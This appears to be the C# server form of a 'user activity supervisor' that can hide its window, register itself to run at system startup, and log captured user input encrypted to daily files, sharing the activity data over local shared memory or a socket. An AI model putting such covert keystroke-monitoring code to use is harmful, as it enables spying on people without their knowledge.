using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

using Nzl.Hook;
using Nzl.Utils;

namespace Nzl.Test.HookServer
{
    public partial class UserActivitySupervisorServerForm : Form
    {
        #region Variables.
        /// <summary>
        /// Set whether the server window is visible.
        /// </summary>
        private bool _isVisible = false;

        /// <summary>
        /// 
        /// </summary>
        private bool _checkStartOnSystemStartup = false;

        /// <summary>
        /// 
        /// </summary>
        private bool _startOnSystemStartup = false;

        /// <summary>
        /// The shared memory.
        /// </summary>        
        private SharedMemory _sharedMemory;

        /// <summary>
        /// Shared memory size, default to 1048576 (1MB).
        /// </summary>
        private int _sharedMemorySize = 1048576;

        /// <summary>
        /// The interval of updating log infor from user activity supervisor.
        /// </summary>
        private int _logUpdateInterval = 1;

        /// <summary>
        /// 
        /// </summary>
        private int _checkClientInterval = 5;

        /// <summary>
        /// 
        /// </summary>
        private bool _isTopMost = true;

        /// <summary>
        /// 
        /// </summary>
        private const string _clientWindowName = "User Activity Monitor";

        /// <summary>
        /// 
        /// </summary>
        private bool _hasClients = false;

        /// <summary>
        /// 
        /// </summary>
        private bool _socketOn = false;

        /// <summary>
        /// 
        /// </summary>
        private int _socketPort = 2000;
        #endregion

        #region Ctor & window event handler.
        /// <summary>
        /// Ctor.
        /// </summary>
        public UserActivitySupervisorServerForm()
        {
            this.InitializeComponent();
            this.Initialize();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="m"></param>
        protected override void DefWndProc(ref Message m)
        {
            switch (m.Msg)
            {
                case Win32API.WM_GET_SHARED_MEMORY_INFO:
                    {
                        try
                        {
                            this._hasClients = true;
                            string sm = "<SharedMemory>"
                                      + "<SharedMemoryName>" + this._sharedMemory.Name + "</SharedMemoryName>"
                                      + "<SharedMemorySize>" + this._sharedMemory.Size + "</SharedMemorySize>"
                                      + "</SharedMemory>";
                            COPYDATASTRUCT cds = new COPYDATASTRUCT();
                            cds.dwData = (IntPtr)256;
                            cds.lpData = sm;
                            cds.cbData = sm.Length;
                            int result = Win32API.SendMessage(m.WParam, Win32API.WM_COPYDATA, IntPtr.Zero, ref cds);
                        }
                        catch { }
                    }
                    break;
                case Win32API.WM_UPDATE_CONFIG:
                    {
                        try
                        {
                            this.txtBox.Clear();
                            this.txtBox.AppendText("Reload configuration by PID=" + m.WParam.ToString() + "\n");
                            this.ReadAppConfig();
                            this.ApplyAppConfig();
                            UserActivitySupervisor.Instance.ProcessXmlFileName = Application.StartupPath + @"\Processes.xml";
                            UserActivitySupervisor.Instance.ReConfig();

                            {
                                this._hasClients = true;
                                string sm = "<SharedMemory>"
                                          + "<SharedMemoryName>" + this._sharedMemory.Name + "</SharedMemoryName>"
                                          + "<SharedMemorySize>" + this._sharedMemory.Size + "</SharedMemorySize>"
                                          + "</SharedMemory>";
                                COPYDATASTRUCT cds = new COPYDATASTRUCT();
                                cds.dwData = (IntPtr)256;
                                cds.lpData = sm;
                                cds.cbData = sm.Length;
                                int result = Win32API.SendMessage(m.WParam, Win32API.WM_COPYDATA, IntPtr.Zero, ref cds);
                            }
                        }
                        catch { }
                    }
                    break;
                default:
                    base.DefWndProc(ref m);
                    break;

            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void UserActivityLoggerServerForm_Shown(object sender, EventArgs e)
        {
            if (this._isVisible == false)
            {
                this.Hide();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void UserActivitySupervisorServerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (this._sharedMemory != null)
            {
                this._sharedMemory.Close();
            }
        }
        #endregion

        #region Initialize.
        /// <summary>
        /// Initialize.
        /// </summary>
        private void Initialize()
        {
            this.ReadAppConfig();
            this.ApplyAppConfig();
            if (UserActivitySupervisor.Instance != null)
            {
                UserActivitySupervisor.Instance.ProcessXmlFileName = Application.StartupPath + @"\Processes.xml";
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="key"></param>
        private string GetConfigValue(string key)
        {
            return MiscUtil.GetConfigValue(Application.ExecutablePath + ".config", key);
        }

        /// <summary>
        /// Read app config.
        /// </summary>
        private void ReadAppConfig()
        {
            try
            {
                ////Get config of whether checking the start up.
                this._checkStartOnSystemStartup = GetConfigValue("checkStartOnSystemStartup") == "Yes";

                ////Get config of whether the server is start on system start-up.
                this._startOnSystemStartup = GetConfigValue("startOnSystemStartup") == "Yes";

                ////Get config of whether the window is visible.
                this._isVisible = GetConfigValue("isVisible") == "Yes";

                ////Get config of interval of updating.
                if (false == string.IsNullOrEmpty(GetConfigValue("logUpdateInterval")))
                {
                    this._logUpdateInterval = System.Convert.ToInt32(GetConfigValue("logUpdateInterval")) * 1000;
                }

                ////Get config of interval of checking the clients.
                if (false == string.IsNullOrEmpty(GetConfigValue("checkClientInterval")))
                {
                    this._checkClientInterval = System.Convert.ToInt32(GetConfigValue("checkClientInterval")) * 1000;
                }

                ////Get config of shared memory size.
                if (false == string.IsNullOrEmpty(GetConfigValue("sharedMemorySize")))
                {
                    this._sharedMemorySize = System.Convert.ToInt32(GetConfigValue("sharedMemorySize"));
                }

                ////Get config of whether wether window is top-most.
                this._isTopMost = GetConfigValue("isTopMost") == "Yes";

                ////Get config of whether turn on the socket communication.
                this._socketOn = GetConfigValue("socketOn") == "Yes";

                ////Get the config of socket port.
                if (this._socketOn)
                {
                    this._socketPort = Convert.ToInt32(GetConfigValue("socketPort"));
                }
            }
            catch { }
        }

        /// <summary>
        /// Apply app config.
        /// </summary>
        private void ApplyAppConfig()
        {
            try
            {
                ////Start on system start up config.
                if (this._checkStartOnSystemStartup)
                {
                    bool startUpFlag = Nzl.Utils.MiscUtil.CheckExistRegisterApp(Application.ProductName);
                    if (this._startOnSystemStartup)
                    {
                        if (startUpFlag == false)
                        {
                            Nzl.Utils.MiscUtil.SetRegistryApp(Application.ProductName, Application.ExecutablePath);
                        }
                    }
                    else
                    {
                        if (startUpFlag)
                        {
                            Nzl.Utils.MiscUtil.DeleteRegisterApp(Application.ProductName);
                        }
                    }

                    Nzl.Utils.FileUtil.WriteText("infor.log",
                                                DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss")
                                                + "\n\tCheck start on system startup is ON"
                                                + "\n\tStart on system startup is "
                                                + (Nzl.Utils.MiscUtil.CheckExistRegisterApp(Application.ProductName) ? "ON" : "OFF")
                                                + "\n");
                }

                ////Form visible config.
                this.Visible = this._isVisible;
                if (this._isVisible)
                {
                    this.Activate();
                }
                else
                {
                    this.Hide();
                }

                /*
                ////Shared memory
                if (this._sharedMemory != null)
                {
                    HookMessageExchanger.Write(this._sharedMemory,
                                                       new HookMessage(HookMessageType.Information,
                                                                               "The shared memory is closed! \n\tName " + this._sharedMemory.Name + "\n\tSize " + this._sharedMemory.Size
                                                                               + "\n\nPlease waiting for the new shared memory to be dispatched!"));
                    this._sharedMemory.Close();
                }

                this._sharedMemory = SharedMemoryFactory.CreateSharedMemory(Guid.NewGuid().ToString(), this._sharedMemorySize);
                
                ////Log update timer.
                this.timerSharedMemory.Stop();
                this.timerSharedMemory.Interval = this._logUpdateInterval;
                this.timerSharedMemory.Start();

                ////Check client 
                this.timerCheckClient.Stop();
                this.timerCheckClient.Interval = this._checkClientInterval;
                this.timerCheckClient.Start();
                */

                ////Top-most.
                this.TopMost = this._isTopMost;

                ////Show configurations.
                this.txtBox.AppendText("Log update interval " + ((this._logUpdateInterval / 1000) + "s").ToString().PadLeft(52 - "Log update interval ".Length) + "\n");
                this.txtBox.AppendText("Short interval " + ((UserActivitySupervisor.Instance.ShortInterval / 1000) + "s").ToString().PadLeft(52 - "Short interval ".Length) + "\n");
                this.txtBox.AppendText("Long interval " + ((UserActivitySupervisor.Instance.LongInterval / 1000) + "s").ToString().PadLeft(52 - "Long interval ".Length) + "\n");
                if (this._socketOn == false)
                {
                    this.txtBox.AppendText("Shared memory information\n");
                    this.txtBox.AppendText("  Name: " + this._sharedMemory.Name.PadLeft(44) + "\n");
                    this.txtBox.AppendText("  Size: " + this._sharedMemory.Size.ToString().PadLeft(44) + "\n");
                }
                else
                {
                    this.txtBox.AppendText("Socket information\n");
                    this.txtBox.AppendText("  Flag: " + (this._socketOn ? "On" : "Off").PadLeft(44) + "\n");
                    this.txtBox.AppendText("  Port: " + this._socketPort.ToString().PadLeft(44) + "\n");
                }

                CommunicationTypeChanged();
                UserActivitySupervisor.Instance.UserInputSupervised += new EventHandler<UserInputEventArgs>(UserActivitySupervisor_Instance_UserInputSupervised);
            }
            catch (Exception exp){
                System.Diagnostics.Debug.WriteLine(exp.ToString());                             
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private void CommunicationTypeChanged()
        {
            if (this._socketOn)
            {
                this.timerSharedMemory.Stop();
                this.timerCheckClient.Stop();
                try
                {
                    this._sharedMemory.Close();
                }
                catch { }

                ////Socket
                try
                {
                    new Thread(this.SocketServerThread).Start();
                }
                catch { }
            }
            else
            {                
                ////Shared memory
                if (this._sharedMemory != null)
                {
                    HookMessageExchanger.Write(this._sharedMemory,
                                                       new HookMessage(HookMessageType.Information,
                                                                               "The shared memory is closed! \n\tName " + this._sharedMemory.Name + "\n\tSize " + this._sharedMemory.Size
                                                                               + "\n\nPlease waiting for the new shared memory to be dispatched!"));
                    this._sharedMemory.Close();
                }

                this._sharedMemory = SharedMemoryFactory.CreateSharedMemory(Guid.NewGuid().ToString(), this._sharedMemorySize);

                ////Form visible config.
                this.Visible = this._isVisible;
                if (this._isVisible)
                {
                    this.Activate();
                }
                else
                {
                    this.Hide();
                }

                ////Log update timer.
                this.timerSharedMemory.Stop();
                this.timerSharedMemory.Interval = this._logUpdateInterval;
                this.timerSharedMemory.Start();

                ////Check client 
                this.timerCheckClient.Stop();
                this.timerCheckClient.Interval = this._checkClientInterval;
                this.timerCheckClient.Start();                
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void UserActivitySupervisor_Instance_UserInputSupervised(object sender, UserInputEventArgs e)
        {
            if (string.IsNullOrEmpty(e.Input) == false)
            {
                Util.FileUtil.WriteText(Application.StartupPath+ "\\" + DateTime.Now.ToString("yyyyMMdd") + ".txt", EncryptUtil.Encrypt(e.Input) + "\n");
            }
        }
        #endregion

        #region Timer tick event handler.
        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerSharedMemory_Tick(object sender, EventArgs e)
        {
            try
            {
                if (this._sharedMemory != null && this._hasClients)
                {
                    string logInfor = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>";
                    logInfor += "<Supervisor>";
                    string sharedMemoryInfor = string.Empty;
                    logInfor += UserActivitySupervisor.Instance.GetXml();
                    logInfor += "</Supervisor>";
                    HookMessageExchanger.Write(this._sharedMemory, new HookMessage(HookMessageType.Data, logInfor));
                }
            }
            catch { }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void timerCheckClient_Tick(object sender, EventArgs e)
        {
            this._hasClients = Win32API.FindWindow(null, _clientWindowName) != IntPtr.Zero;
        }
        #endregion

        #region SocketServer
        private void SocketServerThread()
        {
            IPEndPoint ipe = new IPEndPoint(IPAddress.Parse("127.0.0.1"), this._socketPort);
            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            s.Bind(ipe);
            s.Listen(0);
            try
            {
                while (this._socketOn)
                {
                    try
                    {
                        Socket newSocketConn = s.Accept();//为新建连接创建新的socket
                        string logInfor = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>";
                        logInfor += "<Supervisor>";
                        logInfor += UserActivitySupervisor.Instance.GetXml();
                        logInfor += "</Supervisor>";
                        byte[] bs = Encoding.UTF8.GetBytes(logInfor);
                        newSocketConn.Send(bs, bs.Length, 0);//返回信息给客户端
                        newSocketConn.Shutdown(SocketShutdown.Both);
                        newSocketConn.Close();
                    }
                    catch { }


                    Thread.Sleep(500);
                }
            }
            catch { }
            finally
            {
                s.Close();
            }
        }
        #endregion
    }
}
